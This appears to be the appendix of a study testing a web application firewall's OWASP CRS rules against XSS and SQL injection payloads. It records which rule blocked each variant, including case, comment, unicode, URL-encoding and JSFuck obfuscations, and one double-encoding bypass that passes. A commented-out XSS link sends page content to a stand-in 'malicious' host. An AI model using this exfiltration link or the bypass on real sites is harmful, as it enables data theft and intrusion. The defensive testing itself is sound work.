\section{Attachments}

% \begin{lstlisting}[style=basicStyle, caption=original payloads, label=lst:originalpayloads]
% XSS payloads:
% alert("XSS")
%
% <a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret',data)">ClickMeFor$</a>
% \end{lstlisting}
\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS'), label={lst:alertxssblocked}]
<payload>alert('XSS')</payload>
<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertcasealternationblocked]
<payload>aLeRT('XSS')</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"aLeRT("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
<payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
<fileDetails>[line "205"] [id "942190"]<fileDetails>
<MatchedData>"union select"</MatchedData>
<message>"Detects MSSQL code execution and information gathering attempts"</message>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
<payload>?id=1+union+select+1,2,3--</payload>

<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
<fileDetails>[line "205"] [id "942190"]<fileDetails>
<MatchedData>"union select"</MatchedData>
<message>"Detects MSSQL code execution and information gathering attempts"</message>

<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
<fileDetails>[line "469"] [id "942360"]<fileDetails>
<MatchedData>"1 union select"</MatchedData>
<message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>urllib.parse.quote('alert(`${new Date()}`)')</payload>
<payload>'alert%28%60%24%7Bnew%20Date%28%29%7D%60%29'</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}


\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}]
urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
returns
alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS') in JSFuck blocked, label={lst:alertxssjsfuckblocked}]
<payload>^(Listing~\ref{lst:alertxssjsfuck})^</payload>
<message>"JSFuck / Hieroglyphy obfuscation detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "654"] [id "941360"]<fileDetails>
<MatchedData>
"Suspicious payload found within ARGS_NAMES:[][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]][([][(![] [])[ []] (![] [])[! [] ! []] (![] [])[ ! []] (!![] [])[ []]] [])[ (11337 characters omitted)"
</MatchedData>
<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=basicStyle, caption=alert('XSS') in JSFuck, label={lst:alertxssjsfuck}]
  [][
    (![] + [])[+[]] +
      (![] + [])[!+[] + !+[]] +
      (![] + [])[+!+[]] +
      (!![] + [])[+[]]
  ][
    ([][
      (![] + [])[+[]] +
        (![] + [])[!+[] + !+[]] +
        (![] + [])[+!+[]] +
        (!![] + [])[+[]]
    ] + [])[!+[] + !+[] + !+[]] +
      (!![] +
        [][
          (![] + [])[+[]] +
            (![] + [])[!+[] + !+[]] +
            (![] + [])[+!+[]] +
            (!![] + [])[+[]]
        ])[+!+[] + [+[]]] +
      ([][[]] + [])[+!+[]] +
      (![] + [])[!+[] + !+[] + !+[]] +
      (!![] + [])[+[]] +
      (!![] + [])[+!+[]] +
      ([][[]] + [])[+[]] +
      ([][
        (![] + [])[+[]] +
          (![] + [])[!+[] + !+[]] +
          (![] + [])[+!+[]] +
          (!![] + [])[+[]]
      ] + [])[!+[] + !+[] + !+[]] +
      (!![] + [])[+[]] +
      (!![] +
        [][
          (![] + [])[+[]] +
            (![] + [])[!+[] + !+[]] +
            (![] + [])[+!+[]] +
            (!![] + [])[+[]]
        ])[+!+[] + [+[]]] +
      (!![] + [])[+!+[]]
  ](
    (!![] + [])[+!+[]] +
      (!![] + [])[!+[] + !+[] + !+[]] +
      (!![] + [])[+[]] +
      ([][[]] + [])[+[]] +
      (!![] + [])[+!+[]] +
      ([][[]] + [])[+!+[]] +
      ([] + [])[
        (![] + [])[+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          ([][[]] + [])[+!+[]] +
          (!![] + [])[+[]] +
          ([][
            (![] + [])[+[]] +
              (![] + [])[!+[] + !+[]] +
              (![] + [])[+!+[]] +
              (!![] + [])[+[]]
          ] + [])[!+[] + !+[] + !+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          (![] + [])[!+[] + !+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          (!![] + [])[+!+[]]
      ]()[+!+[] + [!+[] + !+[]]] +
      ((![] + [])[+!+[]] +
        (![] + [])[!+[] + !+[]] +
        (!![] + [])[!+[] + !+[] + !+[]] +
        (!![] + [])[+!+[]] +
        (!![] + [])[+[]] +
        [+!+[]] +
        [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] +
        [!+[] + !+[] + !+[] + !+[]] +
        (!![] + [])[+[]] +
        [!+[] + !+[] + !+[] + !+[] + !+[]] +
        [+[]] +
        (!![] + [])[+[]] +
        [!+[] + !+[] + !+[] + !+[]] +
        [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] +
        (!![] + [])[+[]] +
        [+!+[]] +
        [!+[] + !+[] + !+[]] +
        [+[]] +
        (!![] + [])[+[]] +
        [+!+[]] +
        [!+[] + !+[]] +
        [!+[] + !+[] + !+[]] +
        (!![] + [])[+[]] +
        [+!+[]] +
        [!+[] + !+[]] +
        [!+[] + !+[] + !+[]] +
        (!![] + [])[+[]] +
        [!+[] + !+[] + !+[] + !+[]] +
        [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] +
        (!![] + [])[+[]] +
        [!+[] + !+[] + !+[] + !+[] + !+[]] +
        [+!+[]])
        [
          (![] + [])[!+[] + !+[] + !+[]] +
            (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[
              (!![] + [])[+[]] +
                (!![] +
                  [][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ])[+!+[] + [+[]]] +
                ([] + [])[
                  ([][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ] + [])[!+[] + !+[] + !+[]] +
                    (!![] +
                      [][
                        (![] + [])[+[]] +
                          (![] + [])[!+[] + !+[]] +
                          (![] + [])[+!+[]] +
                          (!![] + [])[+[]]
                      ])[+!+[] + [+[]]] +
                    ([][[]] + [])[+!+[]] +
                    (![] + [])[!+[] + !+[] + !+[]] +
                    (!![] + [])[+[]] +
                    (!![] + [])[+!+[]] +
                    ([][[]] + [])[+[]] +
                    ([][
                      (![] + [])[+[]] +
                        (![] + [])[!+[] + !+[]] +
                        (![] + [])[+!+[]] +
                        (!![] + [])[+[]]
                    ] + [])[!+[] + !+[] + !+[]] +
                    (!![] + [])[+[]] +
                    (!![] +
                      [][
                        (![] + [])[+[]] +
                          (![] + [])[!+[] + !+[]] +
                          (![] + [])[+!+[]] +
                          (!![] + [])[+[]]
                      ])[+!+[] + [+[]]] +
                    (!![] + [])[+!+[]]
                ][
                  ([][[]] + [])[+!+[]] +
                    (![] + [])[+!+[]] +
                    ((+[])[
                      ([][
                        (![] + [])[+[]] +
                          (![] + [])[!+[] + !+[]] +
                          (![] + [])[+!+[]] +
                          (!![] + [])[+[]]
                      ] + [])[!+[] + !+[] + !+[]] +
                        (!![] +
                          [][
                            (![] + [])[+[]] +
                              (![] + [])[!+[] + !+[]] +
                              (![] + [])[+!+[]] +
                              (!![] + [])[+[]]
                          ])[+!+[] + [+[]]] +
                        ([][[]] + [])[+!+[]] +
                        (![] + [])[!+[] + !+[] + !+[]] +
                        (!![] + [])[+[]] +
                        (!![] + [])[+!+[]] +
                        ([][[]] + [])[+[]] +
                        ([][
                          (![] + [])[+[]] +
                            (![] + [])[!+[] + !+[]] +
                            (![] + [])[+!+[]] +
                            (!![] + [])[+[]]
                        ] + [])[!+[] + !+[] + !+[]] +
                        (!![] + [])[+[]] +
                        (!![] +
                          [][
                            (![] + [])[+[]] +
                              (![] + [])[!+[] + !+[]] +
                              (![] + [])[+!+[]] +
                              (!![] + [])[+[]]
                          ])[+!+[] + [+[]]] +
                        (!![] + [])[+!+[]]
                    ] + [])[+!+[] + [+!+[]]] +
                    (!![] + [])[!+[] + !+[] + !+[]]
                ]
            ](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] +
            (![] + [])[!+[] + !+[]] +
            ([![]] + [][[]])[+!+[] + [+[]]] +
            (!![] + [])[+[]]
        ]((!![] + [])[+[]])
        [
          ([][
            (!![] + [])[!+[] + !+[] + !+[]] +
              ([][[]] + [])[+!+[]] +
              (!![] + [])[+[]] +
              (!![] + [])[+!+[]] +
              ([![]] + [][[]])[+!+[] + [+[]]] +
              (!![] + [])[!+[] + !+[] + !+[]] +
              (![] + [])[!+[] + !+[] + !+[]]
          ]() + [])[!+[] + !+[] + !+[]] +
            (!![] +
              [][
                (![] + [])[+[]] +
                  (![] + [])[!+[] + !+[]] +
                  (![] + [])[+!+[]] +
                  (!![] + [])[+[]]
              ])[+!+[] + [+[]]] +
            ([![]] + [][[]])[+!+[] + [+[]]] +
            ([][[]] + [])[+!+[]]
        ](
          ([][
            (![] + [])[+[]] +
              (![] + [])[!+[] + !+[]] +
              (![] + [])[+!+[]] +
              (!![] + [])[+[]]
          ]
            [
              ([][
                (![] + [])[+[]] +
                  (![] + [])[!+[] + !+[]] +
                  (![] + [])[+!+[]] +
                  (!![] + [])[+[]]
              ] + [])[!+[] + !+[] + !+[]] +
                (!![] +
                  [][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ])[+!+[] + [+[]]] +
                ([][[]] + [])[+!+[]] +
                (![] + [])[!+[] + !+[] + !+[]] +
                (!![] + [])[+[]] +
                (!![] + [])[+!+[]] +
                ([][[]] + [])[+[]] +
                ([][
                  (![] + [])[+[]] +
                    (![] + [])[!+[] + !+[]] +
                    (![] + [])[+!+[]] +
                    (!![] + [])[+[]]
                ] + [])[!+[] + !+[] + !+[]] +
                (!![] + [])[+[]] +
                (!![] +
                  [][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ])[+!+[] + [+[]]] +
                (!![] + [])[+!+[]]
            ](
              (!![] + [])[+!+[]] +
                (!![] + [])[!+[] + !+[] + !+[]] +
                (!![] + [])[+[]] +
                ([][[]] + [])[+[]] +
                (!![] + [])[+!+[]] +
                ([][[]] + [])[+!+[]] +
                (![] + [+[]])[
                  ([![]] + [][[]])[+!+[] + [+[]]] +
                    (!![] + [])[+[]] +
                    (![] + [])[+!+[]] +
                    (![] + [])[!+[] + !+[]] +
                    ([![]] + [][[]])[+!+[] + [+[]]] +
                    ([][
                      (![] + [])[+[]] +
                        (![] + [])[!+[] + !+[]] +
                        (![] + [])[+!+[]] +
                        (!![] + [])[+[]]
                    ] + [])[!+[] + !+[] + !+[]] +
                    (![] + [])[!+[] + !+[] + !+[]]
                ]()[+!+[] + [+[]]] +
                ![] +
                (![] + [+[]])[
                  ([![]] + [][[]])[+!+[] + [+[]]] +
                    (!![] + [])[+[]] +
                    (![] + [])[+!+[]] +
                    (![] + [])[!+[] + !+[]] +
                    ([![]] + [][[]])[+!+[] + [+[]]] +
                    ([][
                      (![] + [])[+[]] +
                        (![] + [])[!+[] + !+[]] +
                        (![] + [])[+!+[]] +
                        (!![] + [])[+[]]
                    ] + [])[!+[] + !+[] + !+[]] +
                    (![] + [])[!+[] + !+[] + !+[]]
                ]()[+!+[] + [+[]]],
            )()
            [
              ([][
                (![] + [])[+[]] +
                  (![] + [])[!+[] + !+[]] +
                  (![] + [])[+!+[]] +
                  (!![] + [])[+[]]
              ] + [])[!+[] + !+[] + !+[]] +
                (!![] +
                  [][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ])[+!+[] + [+[]]] +
                ([][[]] + [])[+!+[]] +
                (![] + [])[!+[] + !+[] + !+[]] +
                (!![] + [])[+[]] +
                (!![] + [])[+!+[]] +
                ([][[]] + [])[+[]] +
                ([][
                  (![] + [])[+[]] +
                    (![] + [])[!+[] + !+[]] +
                    (![] + [])[+!+[]] +
                    (!![] + [])[+[]]
                ] + [])[!+[] + !+[] + !+[]] +
                (!![] + [])[+[]] +
                (!![] +
                  [][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ])[+!+[] + [+[]]] +
                (!![] + [])[+!+[]]
            ](
              (![] + [+[]])[
                ([![]] + [][[]])[+!+[] + [+[]]] +
                  (!![] + [])[+[]] +
                  (![] + [])[+!+[]] +
                  (![] + [])[!+[] + !+[]] +
                  ([![]] + [][[]])[+!+[] + [+[]]] +
                  ([][
                    (![] + [])[+[]] +
                      (![] + [])[!+[] + !+[]] +
                      (![] + [])[+!+[]] +
                      (!![] + [])[+[]]
                  ] + [])[!+[] + !+[] + !+[]] +
                  (![] + [])[!+[] + !+[] + !+[]]
              ]()[+!+[] + [+[]]],
            ) + [])[+!+[]],
        ) +
      ([] + [])[
        (![] + [])[+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          ([][[]] + [])[+!+[]] +
          (!![] + [])[+[]] +
          ([][
            (![] + [])[+[]] +
              (![] + [])[!+[] + !+[]] +
              (![] + [])[+!+[]] +
              (!![] + [])[+[]]
          ] + [])[!+[] + !+[] + !+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          (![] + [])[!+[] + !+[]] +
          (!![] +
            [][
              (![] + [])[+[]] +
                (![] + [])[!+[] + !+[]] +
                (![] + [])[+!+[]] +
                (!![] + [])[+[]]
            ])[+!+[] + [+[]]] +
          (!![] + [])[+!+[]]
      ]()[+!+[] + [!+[] + !+[]]],
  )(),
);
\end{lstlisting}


